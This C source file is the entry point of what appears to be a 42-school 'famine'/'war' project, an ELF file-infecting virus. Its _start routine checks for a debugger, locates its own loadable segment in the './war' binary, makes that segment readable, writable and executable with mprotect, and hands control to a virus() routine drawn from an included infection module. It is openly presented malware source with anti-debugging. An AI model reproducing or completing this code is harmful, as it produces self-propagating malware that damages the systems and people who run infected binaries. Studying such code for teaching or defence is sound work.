/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   main.c                                             :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: agrumbac <agrumbac@student.42.fr>          +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2019/06/04 03:39:28 by agrumbac          #+#    #+#             */
/*   Updated: 2019/12/12 18:07:09 by anselme          ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include "famine.h"
#include "syscall.h"
#include "accessors.h"
#include "infect.h"
#include "utils.h"

void	_start(void)
{
	if (detect_spy())
		sys_exit(ft_putstr("spy detected!\n"));

	struct safe_ptr	safe_ptr;
	if (!init_original_safe(&safe_ptr, "./war"))
		sys_exit(ft_putstr("failed to create safe accessor for file ./war\n"));

	struct entry		file_info;
	if (!find_entry(&file_info, safe_ptr))
		sys_exit(ft_putstr("failed to find entry\n"));

	struct elf64_hdr	*elf_hdr = safe_accessor(0, sizeof(*elf_hdr), safe_ptr);
	if (elf_hdr == NULL)
		sys_exit(ft_putstr("failed to read elf header\n"));

	size_t	p_vaddr         = file_info.safe_phdr->p_vaddr;
	size_t	entry_vaddr     = elf_hdr->e_entry;
	size_t	dist_to_pt_load = entry_vaddr - p_vaddr;

	void	*pt_load_addr = (void *)_start - dist_to_pt_load;
	size_t	pt_load_size  = file_info.safe_phdr->p_memsz;
	int	prot_rwx      = 0x07;

	if (sys_mprotect(pt_load_addr, pt_load_size, prot_rwx) < 0)
		sys_exit(ft_putstr("failed to read elf header\n"));

	uint64_t seed[2] = {0l, ~0l};

	virus(seed);
	sys_exit(0);
	__builtin_unreachable();
}
